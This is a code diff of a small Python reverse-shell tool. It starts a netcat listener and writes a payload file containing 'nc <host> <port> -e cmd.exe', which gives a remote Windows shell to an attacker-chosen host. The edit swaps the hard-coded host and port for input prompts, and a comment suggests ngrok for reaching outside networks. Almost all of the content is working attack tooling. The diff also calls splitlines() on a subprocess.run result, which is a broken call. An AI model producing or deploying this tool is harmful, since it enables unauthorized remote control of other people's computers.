@@ -2,8 +2,6 @@
 
 import time
 import subprocess
-from subprocess import Popen,PIPE
-import colorama
 from colorama import Fore, Style
 
 def printBanner():
@@ -22,8 +20,8 @@ def printBanner():
         return (printBanner)
 printBanner()
 
-ncport = 3002 #if you change this port make sure it's free
-nchost = '127.0.0.1' #can be a local ip or external ip, I recommend using ngrok
+ncport = input("external port #: ") #if you change this port make sure it's free
+nchost = input("external address: ") #can be a local ip or external ip, I recommend using ngrok
 bandaid = '-e cmd.exe'
 
 time.sleep(1)
@@ -40,7 +38,7 @@ def main():
         if beginning == '1':
             try: 
                 print("Starting listener and waiting for a connection...\n")
-                cmd = subprocess.check_output(
+                cmd = subprocess.run(
                    'nc -lnvp' + str(ncport), shell=True
                     ).splitlines()
                 return cmd
@@ -55,7 +53,6 @@ def main():
                 f.write(f"nc {nchost} {ncport} {bandaid}")
             print(f"{nameoffile} created.")
             return nameoffile
-            break
         else:
             break
 main()
